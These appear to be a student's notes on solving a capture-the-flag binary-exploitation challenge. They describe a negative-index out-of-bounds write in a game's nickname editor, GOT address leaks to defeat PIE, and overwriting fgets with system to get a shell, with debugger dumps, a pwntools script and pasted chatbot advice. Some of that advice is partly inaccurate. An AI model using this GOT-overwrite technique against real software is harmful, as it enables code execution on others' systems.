# Vulnerable code found in source
```c
sprintf(buffer1, "Gotcha! %s was caught!", encountered);
strcpy(buffer2, "");
```

1. **`sprintf(buffer1, "Gotcha! %s was caught!", encountered);`**
   - This line uses `sprintf` to format a string and write it to `buffer1`. The function `sprintf` does **not** perform any bounds checking, meaning if `buffer1` is too small to hold the formatted string, it can lead to a **buffer overflow**. 
   - If `encountered` is a string that is large enough, this could overwrite adjacent memory locations, leading to a **stack smashing** or potentially overwriting function pointers or return addresses (which is often an attack vector in CTF challenges).

2. **`strcpy(buffer2, "");`**
   - This line uses `strcpy`, which also **does not perform bounds checking**. However, in this case, the source string is empty (`""`), so this line alone is not directly dangerous. The vulnerability in this part of the code would depend on the size of `buffer2` and any other operations that might lead to an overflow or unsafe memory manipulation.

### Key vulnerabilities:
- **`sprintf` without bounds checking**: If `buffer1` is not properly sized, it can cause a buffer overflow, which is a classic vulnerability that can lead to arbitrary code execution or other security issues like **GOT Hijacking** in your context.
- **`strcpy` without bounds checking**: Although this line uses an empty string, improper handling of buffers in general can lead to vulnerabilities, depending on what happens before or after this line.

### Summary:
- The code is vulnerable to buffer overflows, particularly because `sprintf` and `strcpy` do not limit the amount of data written to the buffers. If the buffers (`buffer1` and `buffer2`) are not large enough, this could lead to memory corruption, which can be exploited for various types of attacks, such as **GOT Hijacking**, especially if the buffers are adjacent in memory or if there are function pointers stored there.


1. No, flag revealing, shell calling function. Need to 
- payload can be started at buffer1, 2 
- encountered is just randomized and doesn't seem be to be input, so we cannot make it large enough to overwrite ajacent functions
- buffer1, 2 is not something we input. It's the pokemon's name that goes inside buffer and write memory 
```c
printf("Hello %s", name);        // Outputs to console
sprintf(buffer, "Hello %s", name); // Writes to buffer in memory
```
- so the overwriting is most probably done by writing the pokemon's name as malicious addresses so they do some bad things 

## pwndbg not working 
the program stops nearly immediately, on second `ni` after `start` in pwndbg
```
pwndbg> ni
0x00007ffff7fe3b03 in _start () from /lib64/ld-linux-x86-64.so.2
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────
 RAX  0
 RBX  0
 RCX  0
 RDX  0
*RDI  0x7fffffffdcc0 ◂— 1
 RSI  0
 R8   0
 R9   0
 R10  0
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0
 RSP  0x7fffffffdcc0 ◂— 1
*RIP  0x7ffff7fe3b03 (_start+3) ◂— call _dl_start
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
   0x7ffff7fe3b00 <_start>               mov    rdi, rsp     RDI => 0x7fffffffdcc0 ◂— 1
 ► 0x7ffff7fe3b03 <_start+3>             call   _dl_start                   <_dl_start>
        rdi: 0x7fffffffdcc0 ◂— 1
 
   0x7ffff7fe3b08 <_dl_start_user>       mov    r12, rax
   0x7ffff7fe3b0b <_dl_start_user+3>     mov    r13, rsp
   0x7ffff7fe3b0e <_dl_start_user+6>     mov    rdx, qword ptr [rsp]
   0x7ffff7fe3b12 <_dl_start_user+10>    mov    rsi, rdx
   0x7ffff7fe3b15 <_dl_start_user+13>    and    rsp, 0xfffffffffffffff0
   0x7ffff7fe3b19 <_dl_start_user+17>    mov    rdi, qword ptr [rip + 0x194e0]     RDI, [_rtld_global]
   0x7ffff7fe3b20 <_dl_start_user+24>    lea    rcx, [r13 + rdx*8 + 0x10]
   0x7ffff7fe3b25 <_dl_start_user+29>    lea    rdx, [r13 + 8]
   0x7ffff7fe3b29 <_dl_start_user+33>    xor    ebp, ebp                           EBP => 0
─────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ rdi rsp 0x7fffffffdcc0 ◂— 1
01:0008│         0x7fffffffdcc8 —▸ 0x7fffffffe073 ◂— '/usr/bin/clear'
02:0010│         0x7fffffffdcd0 ◂— 0
03:0018│         0x7fffffffdcd8 —▸ 0x7fffffffe082 ◂— 'CHROME_DESKTOP=code.desktop'
04:0020│         0x7fffffffdce0 —▸ 0x7fffffffe09e ◂— 'COLORFGBG=15;0'
05:0028│         0x7fffffffdce8 —▸ 0x7fffffffe0ad ◂— 'COLORTERM=truecolor'
06:0030│         0x7fffffffdcf0 —▸ 0x7fffffffe0c1 ◂— 'COMMAND_NOT_FOUND_INSTALL_PROMPT=1'
07:0038│         0x7fffffffdcf8 —▸ 0x7fffffffe0e4 ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus'
```
ok nvm it's because of a `clear` c function and a verison without `clear` is provided by the author on the challenge description 



```c
void edit_nickname() {
	int index;
	puts("+---MAIN MENU----------------------------------------------------------UwU------+");
	printf("  Whose nickname do you want to edit? (Please enter an index)\n  ");
	scanf("%d", &index);
	getchar();
	if (index <= TEAM_SIZE) {
		print_ui("menu", true);
		print_team();
		puts("+---MAIN MENU----------------------------------------------------------UwU------+");
		printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
		fgets(TEAM[index-1], 16, stdin);
		TEAM[index-1][strcspn(TEAM[index-1], "\n")] = 0;
	}
}
```
here the fucntion is not checking and limiting my input size, so i guess it is considered as a vulnerablility 
and I am about to test with long nickname 

I am breaking at edit_nickname+234 at `fgets` 

never mind, `fgets` limits my input 


now I am thinking that maybe the key is to send more pokemon to pc `buffer2` and overflow them

this time I am breaking at `play+916` i.e. where the pets are sent to pc2


ok, so buffer1 and 2 are just storing and showing temporary messages I guess

Now I am going to focus more on `PC`, specifically what is that location hmm... like completley gone?


```
from pwn import * 

binary = ("./program")

p = process(binary)

elf = ELF(binary)
s = 'b*play+916'
#gdb.attach(p, s)
p.sendline(b'1')
while True:
    output = p.recvuntil("0: Exit")  # Read output until this message
    if b"Your team is full!" in output:  # Check if the message is received
        break
    p.sendline(b'1')
    p.recvuntil("  1: Attack    2: UwUmon    3: UwUball    4. R̵͎̈ṵ̶͊n!")
    p.sendline(b'3')

p.interactive()
```

my current script that can now send stuff to `pc`


```as
   0x00005555555557b2 <+721>:   lea    rax,[rip+0x4907]        # 0x55555555a0c0 <TEAM>
   0x00005555555557b9 <+728>:   add    rax,rdx
```

these two lines is `strcpy(TEAM[TEAM_SIZE], encountered);` in 

```c
sprintf(buffer1, "Gotcha! %s was caught!", encountered);
strcpy(buffer2, "");
text_box_ui(buffer1, buffer2);
puts("+----------------------------------------------------------------------UwU------+");
strcpy(TEAM[TEAM_SIZE], encountered);
```

Ok, just checked the source code again, there is literally no such a variable called `pc` or some shit 


buffer1 is located at `0x55555555a200`, but be reminded that theres `PIE`
```
0x0000555555555785 <+676>:   lea    rax,[rip+0x4a74]        # 0x55555555a200 <buffer1>
```


This code appears to be a C program implementing a text-based game. It has several notable vulnerabilities that may lead to unintended behaviors, security risks, or exploits. Below are the identified vulnerabilities:

---

### **1. Buffer Overflow Vulnerabilities**
- **`TEAM[index-1]` in `edit_nickname()`**: The function `fgets()` allows up to 16 characters to be read into `TEAM[index-1]`. If the user enters more than 15 characters (plus a null terminator), this will lead to a buffer overflow. Additionally, `strcspn()` correctly removes the newline character but does not handle overflows.
- **`buffer1` and `buffer2`**: These are used without bounds checking in functions like `text_box_ui` and formatted with `sprintf()` without length constraints. If data exceeds 80 characters, this could cause buffer overflow.
  
---

### **2. Input Validation Issues**
- **`index` in `edit_nickname()`**:
  - The input for the index is not properly validated to ensure it's within the bounds of `TEAM_SIZE`. A user can enter a negative or overly large value, causing out-of-bounds access in `TEAM[index-1]`.
- **`CHOSEN` in `play()`**:
  - User input for `CHOSEN` is not validated before being used as an index for `TEAM`. Entering a value greater than `MAX_TEAM_SIZE` (6) will lead to an invalid array access.
- **`option` in `play()` and `menu()`**:
  - These options are not validated. Inputting non-integer data will cause unexpected behavior or crash the program.

---

### **3. Format String Vulnerabilities**
- The program does not use secure formatting functions like `snprintf()`. For example:
  - `sprintf(buffer1, "Gotcha! %s was caught!", encountered);` could lead to vulnerabilities if `encountered` contains malicious format specifiers.

---


---

### **6. Use of `system()`**
- Although the `system()` calls are commented out, the `debug()` function calls `system("")`. Using `system()` unnecessarily introduces command injection vulnerabilities, especially if user input could influence it.

---

### **7. Hardcoded Data**
- **`UwU_NAME`, `Tips`, and `TEAM`**:
  - These arrays are hardcoded in the program. If an attacker can manipulate how they are used (e.g., via buffer overflows), it might lead to unexpected behaviors or leaks of sensitive data.

---

### **8. Unchecked Pointer Access**
- The function `text_box_ui` assumes `text1` and `text2` are always valid strings. If these pointers are unintentionally NULL, dereferencing them will crash the program.

---

### **9. Lack of Thread-Safe Practices**
- The use of global variables (`TEAM`, `TEAM_SIZE`, `CHOSEN`) without mutexes or locking mechanisms can cause race conditions in multi-threaded environments.

---

### **10. Misleading Use of Clear Screen**
- The program attempts to simulate clearing the screen (`system("clear")`) but this is commented out. Users might rely on this behavior, leading to misleading UI states.

---

### Recommendations:
To address these vulnerabilities:
1. **Implement bounds checking** on all array accesses and inputs.
2. **Use safer alternatives** like `snprintf()` and `strncpy()` to handle string operations.
3. **Validate user input** thoroughly to prevent invalid indexes or non-integer inputs.
4. Replace `rand()` with a more secure random function (e.g., `arc4random()` or `random()`).
5. Avoid unnecessary `system()` calls, or ensure they are used securely.
6. Add checks for NULL pointers and array sizes before dereferencing or accessing them.
7. Replace global variables with thread-safe data structures if multi-threading is expected.

Would you like detailed fixes for these vulnerabilities?


to do:

- since debug calls system() somehow (need to know how), the ultimate goal might be: to overwrite string "" in system somehow and call debug somehow 


here

```as
   0x000055555555545e <+190>:   mov    rax,QWORD PTR [rip+0x4d4b]        # 0x55555555a1b0 <stdin@GLIBC_2.2.5>
   0x0000555555555465 <+197>:   mov    edx,DWORD PTR [rbp-0x14]
   0x0000555555555468 <+200>:   sub    edx,0x1
   0x000055555555546b <+203>:   movsxd rdx,edx
   0x000055555555546e <+206>:   mov    rcx,rdx
   0x0000555555555471 <+209>:   shl    rcx,0x4
   0x0000555555555475 <+213>:   lea    rdx,[rip+0x4c44]        # 0x55555555a0c0 <TEAM>
   0x000055555555547c <+220>:   add    rcx,rdx
   0x000055555555547f <+223>:   mov    rdx,rax
   0x0000555555555482 <+226>:   mov    esi,0x10
   0x0000555555555487 <+231>:   mov    rdi,rcx
   0x000055555555548a <+234>:   call   0x5555555551a0 <fgets@plt>
```
is equivalent to 
```c
fgets(TEAM[index-1], 16, stdin);
```
- try edit_nickname 
- see what kind of index input brings you where, i think each positive index is like +16 in bytes

```
pwndbg> x/20s 0x55555555a0c0
0x55555555a0c0 <TEAM>:  "FirebUwU"
0x55555555a0c9 <TEAM+9>:        ""
0x55555555a0ca <TEAM+10>:       ""
0x55555555a0cb <TEAM+11>:       ""
0x55555555a0cc <TEAM+12>:       ""
0x55555555a0cd <TEAM+13>:       ""
0x55555555a0ce <TEAM+14>:       ""
0x55555555a0cf <TEAM+15>:       ""
0x55555555a0d0 <TEAM+16>:       "UwUduck"
0x55555555a0d8 <TEAM+24>:       ""
0x55555555a0d9 <TEAM+25>:       ""
0x55555555a0da <TEAM+26>:       ""
0x55555555a0db <TEAM+27>:       ""
0x55555555a0dc <TEAM+28>:       ""
0x55555555a0dd <TEAM+29>:       ""
0x55555555a0de <TEAM+30>:       ""
0x55555555a0df <TEAM+31>:       ""
0x55555555a0e0 <TEAM+32>:       "CharUwUder"
0x55555555a0eb <TEAM+43>:       ""
0x55555555a0ec <TEAM+44>:       ""
```
address of <team> start with PIE is `0x55555555a0c0`

To do 3:
- check the assembly section for 
```c
scanf("%d", &index);
	getchar();
	if (index <= TEAM_SIZE) {
		print_ui("menu", true);
		print_team();
		puts("+---MAIN MENU----------------------------------------------------------UwU------+");
		printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
```
- check what happens to `TEAM[index-1]` or address accessing mechanism when you input normal indexes
- check with negative indexes
- check the got functions, calculate offset and see if you can reach there 
- fgets to overwrite 

in this challenge, it is likely that I can get shell by 
- somehow overwriting "" in system("") and calling debug()
- injecting shellcode in writable region e.g. .bss and redirect a got function there 




questions: what is a relative write in this context, how can I check and know if a section if writable or not, PIE is enabled, in this context how can I leak an address



```as
0x00005555555553e6 <+70>:    call   0x5555555551f0 <__isoc99_scanf@plt>
   0x00005555555553eb <+75>:    call   0x5555555551c0 <getchar@plt>
   0x00005555555553f0 <+80>:    mov    edx,DWORD PTR [rbp-0x14]
   0x00005555555553f3 <+83>:    mov    eax,DWORD PTR [rip+0x4d27]        # 0x55555555a120 <TEAM_SIZE>
   0x00005555555553f9 <+89>:    cmp    edx,eax
   0x00005555555553fb <+91>:    jg     0x5555555554da <edit_nickname+314>
```

```c
scanf("%d", &index);
	getchar();
	if (index <= TEAM_SIZE) {
```

breaking at +80, right after scannning 

b*edit_nickname+80
b*meun+277
b*edit_nickname+70


## How does the array index calcullation in this program works

```as
0x55555555542e <edit_nickname+142>    mov    eax, dword ptr [rbp - 0x14]     EAX, [0x7fffffffdbbc] => 2
 ► 0x555555555431 <edit_nickname+145>    sub    eax, 1                          EAX => 1 (2 - 1)
   0x555555555434 <edit_nickname+148>    cdqe   
   0x555555555436 <edit_nickname+150>    shl    rax, 4
   0x55555555543a <edit_nickname+154>    mov    rdx, rax                        RDX => 0x10
   0x55555555543d <edit_nickname+157>    lea    rax, [rip + 0x4c7c]             RAX => 0x55555555a0c0 (TEAM) ◂— 'FirebUwU'
   0x555555555444 <edit_nickname+164>    add    rax, rdx                        RAX => 0x55555555a0d0 (TEAM+16) (0x55555555a0c0 + 0x10)
```

`dword ptr [rbp - 0x14]` is my input, it is first moved to eax and through a sequence of calculation:
```as
0x55555555542e <edit_nickname+142>    mov    eax, dword ptr [rbp - 0x14]     EAX, [0x7fffffffdbbc] => 2
 ► 0x555555555431 <edit_nickname+145>    sub    eax, 1                          EAX => 1 (2 - 1)
   0x555555555434 <edit_nickname+148>    cdqe   
   0x555555555436 <edit_nickname+150>    shl    rax, 4
   0x55555555543a <edit_nickname+154>    mov    rdx, rax                        RDX => 0x10
```
it is able to determin how many bytes to add. Then it just load `<TEAM>` and add the bytes to reach to the location, I choosed option `2` i.e. index `1` 

```as
   0x55555555543d <edit_nickname+157>    lea    rax, [rip + 0x4c7c]             RAX => 0x55555555a0c0 (TEAM) ◂— 'FirebUwU'
   0x555555555444 <edit_nickname+164>    add    rax, rdx                        RAX => 0x55555555a0d0 (TEAM+16) (0x55555555a0c0 + 0x10)
```



when I do `-1`: 

```
0x55555555543a <edit_nickname+154>    mov    rdx, rax                        RDX => 0xffffffffffffffe0
   0x55555555543d <edit_nickname+157>    lea    rax, [rip + 0x4c7c]             RAX => 0x55555555a0c0 (TEAM) ◂— 'FirebUwU'
   0x555555555444 <edit_nickname+164>    add    rax, rdx                        RAX => 0x55555555a0a0 (data_start) (0x55555555a0c0 + 0xffffffffffffffe0)
   0x555555555447 <edit_nickname+167>    mov    rsi, rax                        RSI => 0x55555555a0a0 (data_start) ◂— 0
```

The program goes to `data_start` lol 



## address leak via printf

with index `-2`, we got rand()!!!!!!!!

`-1` : a0a0 ---> `data_start`

`-2` : a090 ---> `rand()`
```
RSI => 0x55555555a090 (rand@got[plt]) —▸ 0x7ffff7df6430 (rand) ◂— sub rsp, 8
```
the program is gonna prompt me to give it a new name, it deferences the address and prints its address!!!!!

```
  Please get a new name to 0d\xdf\xf7\xff\x7f! What is its new nickname? 
```

```py
>>> from pwn import * 
>>> x = b'0d\xdf\xf7\xff\x7f'
>>> print(int.from_bytes(x, 'little'))
140737352000560
>>> print(hex(int.from_bytes(x, 'little')))
0x7ffff7df6430
```


Yes, it is possible to leak addresses to defeat PIE (Position Independent Executables). PIE randomizes the base address of the program at runtime, making it challenging to predict memory addresses. However, the program already has mechanisms that can be exploited to leak addresses. Let me walk you through it step by step:

---

### **1. What is PIE and Why Leak Addresses?**
- PIE randomizes the memory layout of the binary, including the locations of the `.text` section, `.data` section, and GOT (Global Offset Table).
- To hijack execution (e.g., via GOT hijacking), you need the exact runtime address of a writable memory region (e.g., GOT or `.bss`) and the target address (e.g., shellcode or another function).

To defeat PIE, you need to leak a runtime address that reveals the base address of the binary. From there, you can calculate offsets for other sections.

---

### **2. Observing the Vulnerable Code**
The function `print_team()` displays the contents of the `TEAM` array, which is located in a writable memory region (`data_start`). When you write to `TEAM` using the negative index, you can overwrite parts of the memory near `data_start`.

The GOT table is typically located close to `data_start`. If you overwrite `TEAM` with the address of a GOT entry, you can use the `print_team()` function to read and leak that address.

---

### **3. Steps to Leak a GOT Address**
#### **Step 1: Identify the GOT Entry to Leak**
- A GOT entry stores the address of a dynamically linked function (e.g., `puts`, `exit`, or `printf`).
- Use a tool like `objdump` or `readelf` to find GOT entries. For example:
  ```
  readelf -r <binary>
  ```
  Look for entries such as:
  ```
  0xdeadbeef  0x55555555  R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
  ```
  This tells you the GOT entry for `puts` is at `0xdeadbeef`.

#### **Step 2: Overwrite `TEAM` with a GOT Entry**
- Use the negative index exploit to overwrite a `TEAM` entry with the address of a GOT entry.
- For example, if the GOT entry for `puts` is located near `data_start`:
  ```c
  TEAM[-1] = &puts@GOT;  // Using the negative index exploit
  ```

#### **Step 3: Print the GOT Entry**
- Call `print_team()` to display the overwritten `TEAM` entry, which now contains the runtime address of `puts`.
- Example output:
  ```
  +-------------------------------------------------------------------------------+
  | [*] 1: 0x7ffff7e40000                                                        |
  +-------------------------------------------------------------------------------+
  ```
  This leaks the address of `puts()`.

#### **Step 4: Calculate the Base Address**
- Use the leaked address of `puts` to calculate the base address of the binary.
- Subtract the known offset of `puts` from the leaked address to get the base address:
  ```
  binary_base_address = leaked_puts_address - known_offset_of_puts;
  ```
  You can find the offset of `puts` using `readelf` or `objdump`:
  ```
  objdump -T <binary> | grep puts
  ```

---

### **4. Example of Leaking an Address**
#### Scenario:
- `puts@GOT` is at an offset of `0x201000` relative to the base address of the binary.
- At runtime, the GOT entry for `puts` contains the address `0x7ffff7e12345`.

#### Exploitation Steps:
1. Overwrite `TEAM[-1]` with the address of `puts@GOT`:
   ```bash
   Enter index: -1
   Enter nickname: 0xdeadbeef (address of puts@GOT)
   ```
2. Call `print_team()`:
   ```bash
   +-------------------------------------------------------------------------------+
   | [*] 1: 0x7ffff7e12345                                                        |
   +-------------------------------------------------------------------------------+
   ```
   This leaks the runtime address of `puts()`.

3. Calculate the base address:
   ```
   binary_base_address = 0x7ffff7e12345 - 0x201000
                      = 0x7ffff7c12345
   ```

---

### **5. Next Steps After Leaking an Address**
- Now that you have the binary base address, you can calculate the runtime addresses of other sections (e.g., `.text` for shellcode or GOT for function pointers).
- Proceed with the GOT hijacking or direct shellcode injection.

---

### **6. Summary of Exploitation Workflow**
1. Use the negative index exploit to overwrite a `TEAM` entry with a GOT entry address.
2. Use `print_team()` to leak the runtime address stored in the GOT entry.
3. Calculate the base address of the binary from the leaked address.
4. Use the base address to calculate offsets for GOT hijacking or shellcode injection.

Let me know if you'd like me to explain any step in more detail or help with a sample payload!



## this one big problem 

i might not be getting the correct libc version 

even through leaking

## to do:4

now that I can leak libc addresses 
- call change a libc address to system 
- e.g. fgets
- input shell string


b * edit_nickname+127



## passing in /bin/sh as 1st argument

- `You can somehow change RDI to be the address of the “/bin/sh” string inside libc `
how can I do it?

### ROP approach (?)

pop rdi ; ret
/bin/sh 
system()

have to overwrite 3 libc functions without causing errors 

the 3 libc functions have to be executing consecutively

that sounds impossible xD 


~ i feel like writing down my own ideas in this way is gooooodo
~ i am proving that I am not totally relying on gpt and I am using my brain 
~ more mindful and prevent the fact that I might just forget the stuff I thought about 


### BOF

hmm does it actually have a BOF vulnerability?



i want to focus on getting the fgets libc function. 
The way I leaked other libc functions was to input negative indexes to get to the libc function regions and overwrite with edit_nickname function. At the same time, the address leaks as nick_name function also print them out 

# Cases that the address does not get leaked

But there are some functions like particularly these 3 
```
[0x558fc215b040] srand@GLIBC_2.2.5 -> 0x7fbb63c4a100 ◂— endbr64 
[0x558fc215b048] fgets@GLIBC_2.2.5 -> 0x7fbb63c83410 ◂— endbr64 
[0x558fc215b050] strcmp@GLIBC_2.2.5 -> 0x7fbb63d9b300 ◂— endbr64
```
which does not get printed 
moments before the function tried to print them 
```
► 0x558fc2156447 <edit_nickname+167>    mov    rsi, rax                RSI => 0x558fc215b050 (strcmp@got[plt]) —▸ 0x7fbb63d9b300 ◂— endbr64                                                                                          
   0x558fc215644a <edit_nickname+170>    lea    rax, [rip + 0x1ecf]     RAX => 0x558fc2158320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x558fc2156451 <edit_nickname+177>    mov    rdi, rax                RDI => 0x558fc2158320 ◂— '  Please get a new name to %s! What is its new nic...'
```

```
 RDI  0x558226cf4320 ◂— '  Please get a new name to %s! What is its new nickname? \n  '
 RSI  0x558226cf7050 (strcmp@got[plt]) —▸ 0x7f351719b300 ◂— endbr64 
 R8   0x51
 R9   0
 R10  0x7f35171d4040 ◂— 0
 R11  0x246
 R12  0x7fff9e854fc8 —▸ 0x7fff9e8560e3 ◂— './GameOfUwU_noclear_patched'
 R13  0x558226cf2bb2 (main) ◂— endbr64 
 R14  0
 R15  0x7f3517327c40 ◂— 0x60b0200000000
 RBP  0x7fff9e854e70 —▸ 0x7fff9e854e90 —▸ 0x7fff9e854ea0 ◂— 1
 RSP  0x7fff9e854e50 ◂— 0
*RIP  0x558226cf2459 (edit_nickname+185) ◂— call printf@plt
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
   0x558226cf2444 <edit_nickname+164>    add    rax, rdx                RAX => 0x558226cf7050 (strcmp@got[plt]) (0x558226cf70c0 + 0xffffffffffffff90)
   0x558226cf2447 <edit_nickname+167>    mov    rsi, rax                RSI => 0x558226cf7050 (strcmp@got[plt]) —▸ 0x7f351719b300 ◂— endbr64                                                                                          
   0x558226cf244a <edit_nickname+170>    lea    rax, [rip + 0x1ecf]     RAX => 0x558226cf4320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x558226cf2451 <edit_nickname+177>    mov    rdi, rax                RDI => 0x558226cf4320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x558226cf2454 <edit_nickname+180>    mov    eax, 0                  EAX => 0
 ► 0x558226cf2459 <edit_nickname+185>    call   printf@plt                  <printf@plt>
        format: 0x558226cf4320 ◂— '  Please get a new name to %s! What is its new nickname? \n  '
        vararg: 0x558226cf7050 (strcmp@got[plt]) —▸ 0x7f351719b300 ◂— endbr64
```

it does get inside of RSI before printf is called
BUt it does not get printed
```
Please get a new name to ! What is its new nickname?
```

```
 RSI  0x558fc215b050 (strcmp@got[plt]) —▸ 0x7fbb63d9b300 ◂— endbr64
```

# cases that the addresses get leaked

Normally, the addresses of other libc functions get printed
```
Please get a new name to \x90-\xbf\xc0\xd9\x7f! What is its new nickname?
```

Moments before they get printed
```
► 0x55ac965a6447 <edit_nickname+167>    mov    rsi, rax                RSI => 0x55ac965ab090 (rand@got[plt]) —▸ 0x7fd9c084a760 ◂— endbr64                                                                                            
   0x55ac965a644a <edit_nickname+170>    lea    rax, [rip + 0x1ecf]     RAX => 0x55ac965a8320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x55ac965a6451 <edit_nickname+177>    mov    rdi, rax                RDI => 0x55ac965a8320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x55ac965a6454 <edit_nickname+180>    mov    eax, 0                  EAX => 0
   0x55ac965a6459 <edit_nickname+185>    call   printf@plt                  <printf@plt>
```
```
 RSI  0x55ac965ab090 (rand@got[plt]) —▸ 0x7fd9c084a760 ◂— endbr64 
 R8   0x51
 R9   0
 R10  0x7fd9c09d4040 ◂— 0
 R11  0x246
 R12  0x7ffeba10bba8 —▸ 0x7ffeba10d0e3 ◂— './GameOfUwU_noclear_patched'
 R13  0x55ac965a6bb2 (main) ◂— endbr64 
 R14  0
 R15  0x7fd9c0c27c40 ◂— 0x60b0200000000
 RBP  0x7ffeba10ba50 —▸ 0x7ffeba10ba70 —▸ 0x7ffeba10ba80 ◂— 1
 RSP  0x7ffeba10ba30 ◂— 0
*RIP  0x55ac965a6459 (edit_nickname+185) ◂— call printf@plt
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
   0x55ac965a6444 <edit_nickname+164>    add    rax, rdx                RAX => 0x55ac965ab090 (rand@got[plt]) (0x55ac965ab0c0 + 0xffffffffffffffd0)
   0x55ac965a6447 <edit_nickname+167>    mov    rsi, rax                RSI => 0x55ac965ab090 (rand@got[plt]) —▸ 0x7fd9c084a760 ◂— endbr64                                                                                            
   0x55ac965a644a <edit_nickname+170>    lea    rax, [rip + 0x1ecf]     RAX => 0x55ac965a8320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x55ac965a6451 <edit_nickname+177>    mov    rdi, rax                RDI => 0x55ac965a8320 ◂— '  Please get a new name to %s! What is its new nic...'
   0x55ac965a6454 <edit_nickname+180>    mov    eax, 0                  EAX => 0
 ► 0x55ac965a6459 <edit_nickname+185>    call   printf@plt                  <printf@plt>
        format: 0x55ac965a8320 ◂— '  Please get a new name to %s! What is its new nickname? \n  '
        vararg: 0x55ac965ab090 (rand@got[plt]) —▸ 0x7fd9c084a760 ◂— endbr64 
```

what do you think has happened and how can I investigate deeper if you do not know what is happening with my given information?




# Now I am thinking that:
Since unleakable addresses can also be overwritten

maybe I can just leak one leak able address, preserve the value, 

calculate the address of system
then use that address of system to overwrite fgets or shits around it





# Going to overwrite fgets, overwrite is possible know by testing
# Whether successfully overwritting 8 bytes of system to it is a concern as fgets take 15 characerts(?)
# [0x557785aed048] fgets@GLIBC_2.2.5 -> 0x7efe1c454ae0  // OMG IT DOES
# but why doesn't it show (system nearby)

'''
 ► 0x564bcd9a048a <edit_nickname+234>    call   fgets@plt                   <fgets@plt>
        s: 0x564bcd9a50c0 (TEAM) ◂— 0x68732f6e69622f /* '/bin/sh' */
        n: 0x10
        stream: 0x7ff1a5018a80 ◂— 0xfbad208b

'''

fgets finally gets called, lets see what happens 

```
pwndbg> ni
[Attaching after process 611903 vfork to child process 613619]
[New inferior 2 (process 613619)]
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
[Detaching vfork parent process 611903 after child exec]
[Inferior 1 (process 611903) detached]
process 613619 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Attaching after Thread 0x7f0666313740 (LWP 613619) vfork to child process 613620]
[New inferior 3 (process 613620)]
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Detaching vfork parent process 613619 after child exec]
[Inferior 2 (process 613619) detached]
process 613620 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Attaching after Thread 0x7fec02793740 (LWP 613620) vfork to child process 613621]
[New inferior 4 (process 613621)]
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Detaching vfork parent process 613620 after child exec]
[Inferior 3 (process 613620) detached]
process 613621 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_nickname" in current context.

```



```
$ ls
assembly     GameOfUwU_noclear          hexdump      noclear   solve.py
core         GameOfUwU_noclear.c        ld-2.34.so   note1.md  source
file         GameOfUwU_noclear_patched  libcleak.py  note.md
GameOfUwU.c  glibc-2.34.tar.gz          libc.so.6    plan.md

```


OMMMMMMMMMGGGGGGGGGGGGGGGGGGGGGG



```
  \x1b[H\x1b[2J\x1b[3J+-------------------------------------------------------------------------------+
|                                                         v        _(    )      |
|                                                       v         (___(__)      |
|                                                    v v                        |
|        _ ^ _                                         v                        |
|       '_\V/ `                                v  v                             |
|       ' oX`                                        v                          |
|          X                                            v                       |
|          X                                                                    |
|          X                   +                                  .             |
|          X     UwU           A_                                 |\            |
|          X.a#######a.       /\-\                                |_\           |
|       .aa##############a   _||"|_                              __|__          |
|    .a############################aa.                           \   /          |
|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+-------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------+
| --Tips of the day--                                                           |
|   Do you know, the most dangerous place is the safest place!                  |
+-------------------------------------------------------------------------------+
+---MAIN MENU----------------------------------------------------------UwU------+
  1: Play    2: View Team    3: Edit Nickname    0: Exit
  $ 3
